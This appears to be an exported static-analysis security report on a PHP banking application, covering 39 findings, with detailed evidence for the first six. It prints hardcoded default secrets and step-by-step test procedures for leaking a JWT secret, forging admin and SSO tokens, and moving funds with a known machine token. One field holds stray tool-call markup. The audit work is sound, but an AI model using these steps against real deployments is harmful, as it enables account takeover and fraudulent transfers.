# SAST Report: SAST – BankOfEd-main.zip

- Exported: 27/09/2026, 12:35:28
- Total issues: 39

## Issue Summary

| # | Severity | Candidate | Confidence | Validation | Reportable | Location |
|---:|---|---|---:|---|---|---|
| 1 | HIGH | Unauthenticated /api/health endpoint discloses JWT secret and DB credentials | 95% | confirmed | Yes | BankOfEd-main/src/Router.php:24-34 |
| 2 | HIGH | Hardcoded default admin JWT signing secret | 90% | confirmed | Yes | BankOfEd-main/config/admin.php:21 |
| 3 | HIGH | Hardcoded default customer JWT signing secret enables auth forgery | 82% | dismissed | No | BankOfEd-main/config/app.php:23 |
| 4 | HIGH | Hardcoded default SSO shared secret allows forged insurance SSO tokens | 75% | confirmed | Yes | BankOfEd-main/config/app.php:33 |
| 5 | HIGH | Hardcoded default machine token allows unauthenticated payment initiation | 93% | confirmed | Yes | BankOfEd-main/config/app.php:35 |
| 6 | MEDIUM | CORS reflects arbitrary Origin with credentials enabled; cors_origin config unused | 75% | dismissed | No | BankOfEd-main/src/Middleware/CorsMiddleware.php:11 |
| 7 | HIGH | Unauthenticated /api/health endpoint leaks JWT secret and DB credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:22-34 |
| 8 | HIGH | Unauthenticated /api/health endpoint leaks JWT secret and DB credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:24-34 |
| 9 | MEDIUM | Hardcoded default JWT secret for admin panel enables admin token forgery | 80% | confirmed | Yes | BankOfEd-main/config/admin.php:21 |
| 10 | HIGH | Unauthenticated /api/health endpoint discloses JWT signing secret and DB credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:24 |
| 11 | MEDIUM | Hardcoded default insurance SSO shared secret allows forging cross-app SSO tokens | 68% | confirmed | No | BankOfEd-main/src/Services/InsuranceService.php:39 |
| 12 | HIGH | Hardcoded default machine token grants unauthenticated access to payment/transfer endpoints | 93% | confirmed | Yes | BankOfEd-main/src/Models/MachineToken.php:24 |
| 13 | HIGH | Stored XSS in admin panel via broken JS-string escaping in dynamically-generated onclick handlers rendered through innerHTML | 92% | confirmed | Yes | BankOfEd-main/public/admin/js/utils.js:40 |
| 14 | HIGH | DOM-based XSS via HTML-entity double-decoding in admin onclick attribute (account_name) | 90% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/accounts.js:50 (rendered via container.innerHTML = html; at line 54) |
| 15 | HIGH | DOM-based XSS via HTML-entity double-decoding in admin onclick attribute (customer name) | 90% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/customers.js:106 (rendered via U.$('customer-detail-content').innerHTML = html; at line 161) |
| 16 | HIGH | Stored XSS via avatar import: attacker-controlled Content-Type header injected into innerHTML-rendered data URI | 90% | confirmed | Yes | BankOfEd-main/public/banking/js/app.js:72 |
| 17 | HIGH | Stored XSS in admin FX Rates table via onclick attribute injection (currency_name) | 80% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/fx-rates.js:42-57 |
| 18 | HIGH | Stored XSS sink: unsanitized FX rate data written via innerHTML in admin panel | 85% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/fx-rates.js:57 |
| 19 | HIGH | Stored XSS via unescaped transaction description in account transaction history | 92% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:164 |
| 20 | HIGH | Stored XSS via unescaped transaction description in account transaction history | 95% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:164 (sink at line 171) |
| 21 | HIGH | Stored XSS via unescaped transaction description on dashboard | 94% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/dashboard.js:91 |
| 22 | HIGH | Stored XSS sink: innerHTML write of transaction list containing unescaped description | 92% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/dashboard.js:98 |
| 23 | LOW | Self-stored XSS via unescaped avatar source_url/avatar_data rendering | 62% | confirmed | No | BankOfEd-main/public/banking/js/pages/profile.js:137 |
| 24 | HIGH | SQL Injection via 'search' parameter in Admin Customer List endpoint | 96% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:28 |
| 25 | HIGH | SQL Injection via 'search' parameter in Admin Customer List (fetch query) | 96% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:33 |
| 26 | HIGH | Unauthenticated /api/health endpoint leaks JWT signing secret and DB credentials | 98% | confirmed | Yes | BankOfEd-main/src/Router.php:20-33 |
| 27 | HIGH | JWT signature never verified in AuthService::decodeToken — full authentication bypass affecting TOTP verify and all AuthMiddleware-protected routes | 97% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:50-63 |
| 28 | HIGH | SQL Injection via unsanitized 'sort' GET parameter in transaction history query | 92% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:47 |
| 29 | HIGH | SQL Injection via unsanitized 'sort' GET parameter (default account_id path) | 92% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:62 |
| 30 | HIGH | SQL injection via search parameter in AdminUserController::index | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:20-33 |
| 31 | HIGH | Unauthenticated full database export endpoint leaks password hashes and TOTP secrets | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:172-183 |
| 32 | HIGH | Broken authorization in machine-to-machine funds transfer allows draining arbitrary customer accounts | 72% | confirmed | Yes | BankOfEd-main/src/Controllers/PaymentController.php:180-196 |
| 33 | HIGH | SSRF via unrestricted avatar URL fetch in ProfileController::avatarProxy | 94% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:64-97 |
| 34 | MEDIUM | Passwords hashed with unsalted MD5 instead of a secure algorithm | 93% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:22-32 |
| 35 | HIGH | JWT signature not verified when decoding bearer tokens (auth bypass / forgery) | 97% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:50-64 |
| 36 | HIGH | IDOR: external transfer source account not verified to belong to the authenticated user | 97% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:172-176 |
| 37 | HIGH | TOTP/2FA can be bypassed for external transfers when not configured or code omitted | 93% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:236-246 |
| 38 | HIGH | IDOR in ProfileController::update leaks any user's password hash and TOTP secret (full account takeover) | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:52-60 |
| 39 | HIGH | BOLA in TransactionController::show allows viewing any user's transaction by ID | 96% | confirmed | Yes | BankOfEd-main/src/Controllers/TransactionController.php:40-46 |

## 1. Unauthenticated /api/health endpoint discloses JWT secret and DB credentials

- Lead reference: CVTA-001
- Category: A05
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:24-34
- Fingerprint: f1af29e899421fb673d867741b8964f57856278ce92a2ceaea7778cbab4fa019

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:24-34
```

#### Controls encountered

```
[
  "None – route explicitly sets 'auth' => false so AuthMiddleware/MachineAuthMiddleware never execute for this handler",
  "No output filtering/redaction applied to config values before being placed in JSON response"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "AuthMiddleware::decodeToken does not actually verify the JWT signature at all (it just base64-decodes the payload and checks 'exp'), meaning forging valid-looking tokens for regular AuthMiddleware-protected routes does not strictly require knowledge of jwt_secret. This is a separate, arguably worse defect but does not defeat the disclosure vulnerability itself — the endpoint still leaks the JWT signing secret and DB credentials to unauthenticated callers, which remains a serious impact for other consumers (AdminAuthController/AdminAuthMiddleware use signature-checked JWTs, though against config/admin.php not config/app.php, so admin secret differs)."
]
```

#### Proof gaps

```
[
  "Whether config/admin.php shares any secret material with config/app.php was not confirmed; admin JWT verification uses a separate config file so the leaked app.php jwt_secret may not directly grant admin access, only regular-user-scoped forgery/impersonation capability, which is still high severity given the impact description already focuses on 'signing auth JWTs' (non-admin) rather than admin escalation."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated attacker",
    "HTTP GET /api/health",
    "Router::dispatch() route table (auth=>false, no middleware invoked)",
    "Router::health() handler",
    "config/app.php loaded (jwt_secret, db_host, db_name, db_user)",
    "Response::success() JSON body returned to caller",
    "Leaked jwt_secret used offline to sign a forged HS256 JWT (e.g. {sub:1,exp:future})",
    "AuthMiddleware::handle() / AuthService on any 'auth'=>true route accepts forged token",
    "Arbitrary AuthMiddleware-protected endpoint (e.g. GET /api/profile, POST /api/transfers/own) impersonating any user id"
  ],
  "impact": "Complete authentication bypass for the customer-facing API: any anonymous caller learns the JWT HMAC secret and can forge valid session tokens for any user id, then perform arbitrary account/profile/transfer actions as that user. Also discloses DB host/name/user, aiding further compromise (e.g. combined with the SQLi or export endpoint findings).</impact>\n<parameter name=\"severity_reasoning\">No authentication or prior access is required (single GET), the disclosed secret directly enables forging tokens accepted by AuthMiddleware for every protected banking endpoint, and DB connection metadata is also exposed — full compromise of confidentiality and integrity with trivial exploitability justifies High severity.",
  "severity_reasoning": "",
  "dynamic_test": "curl -s http://target/api/health and confirm the JSON response contains a non-null 'jwt_secret' value along with db_host/db_name/db_user; then craft a JWT (header {\"alg\":\"HS256\",\"typ\":\"JWT\"}, payload {\"sub\":1,\"exp\":<future_ts>}) signed with the disclosed secret using a JWT library, send it as 'Authorization: Bearer <token>' to GET /api/profile, and confirm a 200 response returning user id 1's profile data without ever logging in."
}
```

#### Validator reasoning

Source-to-sink path is fully verified in code. In Router.php, the route `/api/health` is registered with `'auth' => false` (line ~87), and in dispatch() the auth check is only performed when `$requiresAuth === true` or `'machine'` — for `false` no middleware runs at all, so the handler executes for any unauthenticated request. The `health()` handler (lines 24-34) requires config/app.php and returns `db_host`, `db_name`, `db_user`, and `jwt_secret` verbatim in the JSON response via Response::success(), with no redaction/filtering. config/app.php confirms `jwt_secret` defaults to a hardcoded value `'bankofed-dev-secret-change-in-production'` when the JWT_SECRET env var is absent, and is otherwise the literal secret used elsewhere. I verified that this exact same secret is the one used to sign real JWTs: AuthService::createToken() calls `JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm'])` using the identical config/app.php values, and AuthMiddleware is the gate protecting the majority of authenticated endpoints (profile, accounts, transfers, transactions, etc.). Therefore, any unauthenticated actor can call GET /api/health, obtain the exact HMAC signing key, and use it to forge valid, signed JWTs for arbitrary user IDs, which AdminAuthMiddleware-style signature checks would accept for normal AuthMiddleware-protected resources (note: AuthMiddleware's own decodeToken doesn't even verify signatures currently, an even more severe secondary issue, but that does not diminish this disclosure — it only makes exploitation easier). DB host/name/user are also disclosed, aiding further attack. No authentication, authorization, filtering, output encoding, or rate limiting mitigates this; the route is explicitly and intentionally set to `auth => false` with no other guard in the code path. This is a concrete, directly reachable, unmitigated CWE-200/A05 sensitive-data-exposure vulnerability.

## 2. Hardcoded default admin JWT signing secret

- Lead reference: CVTA-002
- Category: A02
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/admin.php:21
- Fingerprint: a3c293de70466b7ddca60496c56cd37c8170cf6b79f19e763dfb1800028a3f27

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/admin.php",
  "line": 21,
  "symbol": "jwt_secret",
  "input": "getenv('ADMIN_JWT_SECRET') fallback"
}
```

#### Controls encountered

```
[
  "Issuer claim check (iss === 'BankOfEdAdmin') in AdminAuthMiddleware — bypassable since attacker fully controls the forged payload",
  "Revocation list lookup by jti — irrelevant to a freshly forged, never-before-seen jti",
  "Admin user existence check by sub id — bypassable by guessing/enumerating low integer ids (e.g. 1) which are highly likely to exist as seeded admin accounts"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Middleware/AdminAuthMiddleware.php",
  "line": 27,
  "symbol": "JWT::decode",
  "operation": "verify admin session token with hardcoded secret"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Cannot verify at static-analysis time whether a real production deployment actually sets ADMIN_JWT_SECRET to a non-default value in its live .env (this is inherently a runtime/operational fact, not resolvable from source alone)",
  "Exploitation requires guessing a valid admin user id (sub) that exists in admin_users; while plausible (id=1 is a common first-admin convention), this is not independently confirmed from a seed/migration file in this review"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with only public source-code access (no credentials)",
    "Deployment that never overrides ADMIN_JWT_SECRET env var",
    "config/admin.php fallback constant 'bankofed-admin-secret-change-in-production'",
    "Attacker crafts admin JWT payload {sub:1,role:admin,exp:future}",
    "Attacker signs token offline using firebase/php-jwt (or any JWT lib) with the known hardcoded secret",
    "HTTP request with Authorization: Bearer <forged token> to any /api/admin/* route",
    "AdminAuthMiddleware::handle() -> JWT::decode() verifies signature using the same hardcoded secret -> succeeds",
    "Any admin-panel endpoint (customer management, balance edits, FX rate management, DB reset)"
  ],
  "impact": "Full administrative takeover of the banking admin panel without any credentials in any deployment that has not rotated ADMIN_JWT_SECRET, including customer PII access, balance manipulation, and destructive DB reset operations.",
  "severity_reasoning": "Signature verification is technically performed correctly, but the key itself is a public, hardcoded default; a very plausible first-run/default deployment scenario grants total admin privilege escalation with no authentication step, warranting High severity.",
  "dynamic_test": "In a test instance without ADMIN_JWT_SECRET set, use a JWT library to mint a token: header {\"alg\":\"HS256\",\"typ\":\"JWT\"}, payload {\"sub\":1,\"role\":\"admin\",\"exp\":<future>}, signed with secret 'bankofed-admin-secret-change-in-production'; send GET /api/admin/customers with Authorization: Bearer <token> and confirm HTTP 200 with customer list returned, proving forged-token acceptance."
}
```

#### Validator reasoning

config/admin.php falls back to the hardcoded literal 'bankofed-admin-secret-change-in-production' whenever ADMIN_JWT_SECRET is unset. This exact literal is also what ships in the repo's own .env.example (ADMIN_JWT_SECRET=bankofed-admin-secret-change-in-production), reinforcing that a first-run/default deployment following the shipped example would use this known secret verbatim. AdminAuthController::login() signs the admin session JWT with $config['jwt_secret'] (HS256) and AdminAuthMiddleware::handle() verifies incoming Bearer tokens with the same $config['jwt_secret'] via JWT::decode(new Key(...)). There is no additional secret rotation, no KMS-backed key, and no runtime check that a non-default secret was configured. The middleware's only extra checks after signature verification are: issuer string equals 'BankOfEdAdmin' (attacker controls this claim when forging, trivially satisfiable), revocation-list lookup by jti (attacker mints a fresh jti with no prior revocation entry), and existence of an admin_users row matching payload->sub (an attacker can enumerate/guess low integer ids such as 1, which is highly likely to be the first/only seeded admin in this kind of app). Since HS256 uses a symmetric secret for both signing and verification, knowledge of the (public, checked-into-source) fallback secret is sufficient for an external attacker to mint a token JWT::encode(['iss'=>'BankOfEdAdmin','sub'=>1,'jti'=>random,'iat'=>now,'exp'=>future], 'bankofed-admin-secret-change-in-production', 'HS256') and pass AdminAuthMiddleware, gaining full admin API access with zero credentials. This is a concrete, demonstrable source-to-sink path (hardcoded secret constant -> JWT::encode/JWT::decode) with no effective blocking control preventing exploitation when the operator does not override ADMIN_JWT_SECRET — a realistic default-deployment scenario given the identical placeholder is present in the shipped .env.example.

## 3. Hardcoded default customer JWT signing secret enables auth forgery

- Lead reference: CVTA-003
- Category: A02
- Severity: HIGH
- Confidence: 82%
- Validation: dismissed
- Reportable: No
- Location: BankOfEd-main/config/app.php:23
- Fingerprint: 1b9a9cd01a0ed864fac66c7fa4417f3a1813336ae8fcae04c08e7d48df6ec0a0

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 23,
  "symbol": "jwt_secret",
  "input": "getenv('JWT_SECRET') fallback"
}
```

#### Controls encountered

```
[
  "None effective for the claimed mechanism, but the claimed mechanism itself is inapplicable: AuthService::decodeToken() never performs HMAC signature verification, so the hardcoded secret is not actually consulted during token verification for the customer auth path.",
  "AdminAuthMiddleware (a separate code path) does perform real JWT::decode()+Key() verification with the config secret, meaning the 'admin secret' analog referenced in filter_reasoning is a different, unvalidated candidate."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "line": 17,
  "symbol": "JWT decode",
  "operation": "verify customer session token with hardcoded secret"
}
```

#### Counterevidence

```
[
  "src/Services/AuthService.php decodeToken(): comment explicitly says 'Decode token payload without strict signature verification' and the implementation only base64-decodes parts[1] and checks 'exp' — it never calls JWT::decode with a Key/secret.",
  "grep across the repo shows JWT::decode()+Key(...) signature verification used only in AdminAuthMiddleware.php and tests/InsuranceTest.php, not in the customer AuthMiddleware/AuthService path cited by this candidate.",
  "Because signature verification is skipped entirely for customer tokens, the auth-bypass exploit works regardless of whether JWT_SECRET is set to a strong random value in production, directly contradicting the candidate's stated precondition and sink behavior."
]
```

#### Proof gaps

```
[
  "The candidate does not address the fact that AuthService::decodeToken skips signature verification, which fundamentally changes the exploit precondition and mechanism described.",
  "No confirmation that this discrepancy was considered when the sink_trace was recorded as 'verify customer session token with hardcoded secret' at AuthMiddleware.php:17 (that line is only the Bearer-header regex check, not a signature verification call)."
]
```

#### Attack path

Not available for this candidate

#### Validator reasoning

The candidate's claimed mechanism does not match the actual code. The hardcoded fallback secret in config/app.php ('bankofed-dev-secret-change-in-production') is real and is used by AuthService::createToken() to *sign* tokens via JWT::encode(). However, the claimed sink — AuthMiddleware verifying customer Bearer tokens 'using this same secret' — is false. AuthMiddleware::handle() calls AuthService::decodeToken(), whose own comment states it 'decode[s] token payload without strict signature verification': it merely splits the JWT on '.', base64-decodes the payload, and checks the 'exp' claim. It never calls JWT::decode()/Firebase\JWT with the configured secret, and never verifies the HMAC signature at all. Grep confirms JWT::decode()+Key() signature verification is only used in AdminAuthMiddleware (separate admin path) and in tests — not in the customer AuthMiddleware/AuthService path cited here.

Practical consequence: forging a valid customer session token does NOT require knowledge of the JWT secret (default or otherwise) at all — an attacker can submit any base64 payload with an arbitrary/absent signature and satisfy decodeToken() as long as the JSON payload has a future 'exp' and the referenced 'sub' user id exists. This is a strictly worse, unconditional authentication bypass that is completely independent of whether JWT_SECRET is set in production. It contradicts the candidate's stated precondition ('Requires production deployment to leave JWT_SECRET unset') and its sink description ('verify customer session token with hardcoded secret'), because no signature check occurs in this code path regardless of the secret's value.

Because the specific source-to-sink causal chain asserted by this lead (hardcoded default secret → signature verified with that secret → forgeable if operator misconfigures) is factually incorrect for the customer auth path, the lead as described should be dismissed. (The genuinely worse, unconditional missing-signature-verification bug in AuthService::decodeToken is a distinct defect not captured by this hypothesis and is out of scope for this validation.)

## 4. Hardcoded default SSO shared secret allows forged insurance SSO tokens

- Lead reference: CVTA-004
- Category: A02
- Severity: HIGH
- Confidence: 75%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/app.php:33
- Fingerprint: 6702135692dacd2cdfe8555dcbab01653d6c33c09c3e660be72864df34976040

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 33,
  "symbol": "insurance_sso_secret",
  "input": "getenv('INSURANCE_SSO_SECRET') fallback"
}
```

#### Controls encountered

```
[
  "Route requires 'auth'=>true for BankOfEd's own /api/insurance/sso* endpoints (irrelevant to the actual forgery attack against the partner app, which is external to those endpoints)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/InsuranceService.php",
  "line": 39,
  "symbol": "JWT::encode",
  "operation": "sign SSO assertion with hardcoded shared secret"
}
```

#### Counterevidence

```
[
  "The partner (FACE Insurance) application's token-verification logic is not present in this repository, so it cannot be proven with 100% certainty that production deployments haven't overridden INSURANCE_SSO_SECRET or that the partner app strictly requires this exact secret",
  "Exploiting this requires an attacker to also know/reach the partner application's SSO endpoint, which is outside the scanned codebase"
]
```

#### Proof gaps

```
[
  "Cannot directly observe the partner application's JWT verification code to confirm it uses the identical default secret in production",
  "No evidence in this repo of whether real deployments set INSURANCE_SSO_SECRET via environment/secrets manager outside of .env/.env.example"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with only public source-code access (no credentials)",
    "Deployment that never overrides INSURANCE_SSO_SECRET env var",
    "config/app.php fallback constant 'bankofed-goosecable-sso-shared-secret-key-32b'",
    "Attacker crafts SSO JWT payload {sub:<victim_email>,name:<victim_name>,exp:future}",
    "Attacker signs the token offline with the known hardcoded secret (HS256), mirroring InsuranceService::generateSsoToken()",
    "Attacker submits the forged token to the FACE Insurance partner application's SSO login endpoint (trusts tokens signed with the shared secret)",
    "Partner application accepts the token as a valid BankOfEd identity assertion",
    "Attacker is logged into the insurance portal impersonating the victim customer"
  ],
  "impact": "Impersonation of any BankOfEd customer (or arbitrary crafted identity) on the partner FACE Insurance application via forged SSO assertions, exposing that customer's insurance data/actions to the attacker.",
  "severity_reasoning": "The shared secret is published in source and used to sign cross-system identity assertions trusted by an external partner with no additional verification; forging it yields cross-application identity impersonation with no credentials required, meriting High severity though slightly lower confidence since it requires the partner to also use the unrotated default.",
  "dynamic_test": "Without setting INSURANCE_SSO_SECRET, mint a JWT with payload {\"sub\":\"victim@example.com\",\"name\":\"Victim Name\",\"exp\":<future>} signed HS256 with 'bankofed-goosecable-sso-shared-secret-key-32b'; supply it to the insurance SSO redirect/login flow exposed by GET /api/insurance/sso-redirect (or directly to the partner endpoint if accessible) and confirm the session/response establishes an authenticated context for the victim identity without the victim's involvement."
}
```

#### Validator reasoning

config/app.php:33 defines 'insurance_sso_secret' with a fallback to a hardcoded literal ('bankofed-goosecable-sso-shared-secret-key-32b') when INSURANCE_SSO_SECRET is unset. This value flows directly and unmodified into InsuranceService::generateSsoToken(), which uses it as the HMAC key for JWT::encode() to sign an SSO assertion asserting the authenticated user's email (sub) and name — a token intended to be trusted by an external/partner application (FACE Insurance, per getSsoUrl()/insurance_app_url). The .env.example file, which documents the expected environment configuration, does not set INSURANCE_SSO_SECRET at all (only DB_*, JWT_SECRET, CORS_ORIGIN, ADMIN_* are present), meaning a straightforward deployment following the example file will silently retain the hardcoded default. There is no other control (rotation, warning, runtime check) anywhere in app.php or InsuranceService.php that prevents use of the default. This matches classic CWE-798 (hardcoded credentials)/CWE-321 (hardcoded cryptographic key) used for a cross-trust-boundary signing operation: anyone who reads the public repo (or this scan) obtains the exact secret needed to mint tokens with an arbitrary 'sub'/'name', enabling impersonation against any endpoint that verifies tokens with that shared secret (the partner insurance app's /sso endpoint, which is outside this repo). The BankOfEd-side endpoints (/api/insurance/sso, /api/insurance/sso-redirect) do require 'auth'=>true, but that only means BankOfEd-authenticated users can request tokens for themselves via this repo's controller; the actual exploitable surface described (forging arbitrary identity assertions and presenting them directly to the partner app) does not require calling those BankOfEd endpoints at all — it only requires knowledge of the hardcoded secret and the JWT structure, both of which are fully visible in this source tree. This is a genuine hardcoded-secret / broken shared-trust vulnerability with a clear, reachable source-to-sink path within this repository.

## 5. Hardcoded default machine token allows unauthenticated payment initiation

- Lead reference: CVTA-005
- Category: A07
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/app.php:35
- Fingerprint: c3880bd70d7f642183e0a81f8329177842beca73bdcbb400ca757937a000c97f

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 35,
  "symbol": "machine_token",
  "input": "getenv('MACHINE_TOKEN') fallback"
}
```

#### Controls encountered

```
[
  "Route requires Authorization: Bearer header matching either a DB-stored token hash or the config fallback - but this is not an effective control since the DB-seeded value and the fallback default are the same publicly known literal",
  "PaymentController restricts the authorized machine identity to only debit the specific FACE Insurance merchant account or user #16's account (cannot drain arbitrary accounts) - narrows blast radius but does not prevent unauthorized transfers from that specific privileged account"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 188,
  "symbol": "PaymentController::transfer",
  "operation": "authorize payment based on hardcoded fallback machine identity"
}
```

#### Counterevidence

```
[
  "Exploitation requires the operator to never set the MACHINE_TOKEN environment variable to a different secret than the shipped default AND to either leave the DB seed value unrotated or leave the machine_tokens table unseeded - i.e., a real-world hardened production deployment that rotates both the env var and the DB row would not be vulnerable",
  "The attack is scoped to only the FACE Insurance merchant account / user #16's account, not arbitrary victim accounts, limiting (but not eliminating) impact"
]
```

#### Proof gaps

```
[
  "Cannot confirm from static source alone whether the actual target deployment has overridden MACHINE_TOKEN via environment and/or rotated the machine_tokens DB row after seeding; however, the shipped seed.sql and default config both use the identical secret, so the out-of-the-box/default deployment state is vulnerable by design",
  "No dynamic test was performed against a running instance to confirm the HTTP-level exploit end-to-end (e.g., confirming FastRoute path matching for /api/payments/transfer and header parsing edge cases), though the code path is unambiguous"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with only public source-code access (no credentials)",
    "Deployment that never overrides MACHINE_TOKEN env var (or has default seed.sql data)",
    "config/app.php fallback constant 'mch_face_insurance_secret_key_2026'",
    "HTTP POST /api/payments/transfer with Authorization: Bearer mch_face_insurance_secret_key_2026",
    "Router::dispatch() -> MachineAuthMiddleware::handle()",
    "MachineToken::validateToken() DB lookup misses, falls back to literal string comparison -> returns machine identity 'configured_machine_token'",
    "PaymentController::transfer() machineName allow-list check passes for 'configured_machine_token'",
    "Account::updateBalance() debits FACE Insurance merchant account / user #16's account, credits attacker-controlled destination BSB/account",
    "Transaction::create() persists the fraudulent transfer"
  ],
  "impact": "Unauthenticated remote attacker can move funds out of the privileged FACE Insurance/settlement account to any destination account they control, a direct financial-fraud primitive requiring zero valid credentials.",
  "severity_reasoning": "A single hardcoded token, published in source, is sufficient to authorize real money movement via a critical financial endpoint with no user interaction — direct monetary loss and complete authentication bypass for the machine-auth tier justify High severity.",
  "dynamic_test": "POST /api/payments/transfer with header 'Authorization: Bearer mch_face_insurance_secret_key_2026' and JSON body {from_bsb, from_account_number: <FACE Insurance merchant account or user #16's account>, to_bsb, to_account_number: <attacker test account>, amount: 10.00}; confirm HTTP 200 success response and verify via GET /api/accounts (attacker side) or DB inspection that the balance moved, all without any customer JWT."
}
```

#### Validator reasoning

Full source-to-sink path verified in code:
1. config/app.php:35 hardcodes 'machine_token' => getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026'.
2. Router.php registers POST /api/payments/transfer (and /api/payments/process) with 'auth' => 'machine', which dispatches to MachineAuthMiddleware::handle(). This middleware is the ONLY control on this route - there is no additional user/JWT auth, IP allowlist, or CSRF/network control (confirmed via grep, no IP/allowlist logic found anywhere).
3. MachineAuthMiddleware extracts the Bearer token and calls MachineToken::validateToken($rawToken).
4. MachineToken::validateToken first checks the machine_tokens DB table by SHA256 hash, then falls back: `$fallbackToken = $config['machine_token'] ?? 'mch_...'; if ($rawToken === $fallbackToken) return ['name'=>'configured_machine_token', ...]`.
5. Critically, install/seed.sql (lines 252-254) ALSO seeds the machine_tokens table with a row named 'face_insurance' whose token_hash is SHA2 of the exact same literal 'mch_face_insurance_secret_key_2026'. This means the primary (non-fallback) DB-backed path grants the same privileged machine identity using the identical hardcoded value shipped in source control - so the exploit is not limited to the "unseeded DB" edge case cited in proof_gaps; it works against a normally-seeded, out-of-the-box installation too.
6. The same literal secret is additionally rendered in public/admin/index.html:219 (admin UI displays 'mch_face_insurance_secret_key_2026' directly), further confirming it is not treated as a real secret in this codebase.
7. PaymentController::transfer() line ~188 explicitly special-cases `$machineName === 'face_insurance' || $machineName === 'configured_machine_token'`, authorizing that identity to move funds from the FACE Insurance merchant account (Merchant::findByMerchantId('faceinsurance') -> account_id 100) or user #16's account, with no other authentication/authorization step. The destination account (to_bsb/to_account_number) is attacker-supplied and, for external (non-BankOfEd) BSBs, is not required to exist or be owned by anyone in particular (targetAccountId can remain null while the outgoing debit still executes), enabling exfiltration.
8. Therefore, any external attacker who knows this default/published secret (present in the repo's config, seed.sql, and even the admin UI) can send `Authorization: Bearer mch_face_insurance_secret_key_2026` to POST /api/payments/transfer with from_bsb/from_account_number matching the FACE Insurance merchant account or user #16's account, and move funds out without ever authenticating as a real user.

This is a legitimate hardcoded-credential / weak machine-authentication vulnerability (CWE-798/CWE-259, OWASP A07) with a concrete, currently-reachable sink and no effective compensating control.

## 6. CORS reflects arbitrary Origin with credentials enabled; cors_origin config unused

- Lead reference: CVTA-006
- Category: A05
- Severity: MEDIUM
- Confidence: 75%
- Validation: dismissed
- Reportable: No
- Location: BankOfEd-main/src/Middleware/CorsMiddleware.php:11
- Fingerprint: a51633831f0434d3b83aba21962ff07e8731dab5a41d213473b1054c0c9494c4

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/app.php",
  "line": 32,
  "symbol": "cors_origin",
  "input": "getenv('CORS_ORIGIN') default '*' (unused)"
}
```

#### Controls encountered

```
[
  "Authentication implemented solely via manually-set Authorization: Bearer header, verified server-side by AuthMiddleware/AdminAuthMiddleware/MachineAuthMiddleware",
  "No cookie-based session or setcookie()/Set-Cookie usage anywhere in the codebase (confirmed via grep)",
  "Token is stored in browser localStorage, which is same-origin-isolated and not automatically exposed to or sent by other origins",
  "Browsers do not auto-attach Authorization headers cross-origin the way they do cookies, so CORS Allow-Credentials has no bearing on token-based auth here"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Middleware/CorsMiddleware.php",
  "line": 11,
  "symbol": "header Access-Control-Allow-Origin",
  "operation": "reflect arbitrary Origin with credentials true"
}
```

#### Counterevidence

```
[
  "grep across the repo shows zero occurrences of setcookie/Set-Cookie/session_start/$_COOKIE, confirming no cookie-based session exists that credentialed CORS could leverage",
  "AuthMiddleware.php requires an explicit Bearer token in the Authorization header and rejects requests without one (401), which an attacker page cannot forge without already knowing the victim's token",
  "Front-end api.js explicitly reads the token from localStorage and sets the header in JS on each request; this is not something the browser does automatically for cross-origin requests, unlike cookies"
]
```

#### Proof gaps

```
[
  "Did not exhaustively review every endpoint/controller for an alternate implicit-auth mechanism (e.g., IP allowlisting or a hidden cookie-based fallback) beyond grep coverage, though none was found",
  "Did not verify whether any browser extension, proxy, or non-browser HTTP client in the real deployment environment might rely on cookies for the machine_token or SSO flows, which could reintroduce partial risk"
]
```

#### Attack path

Not available for this candidate

#### Validator reasoning

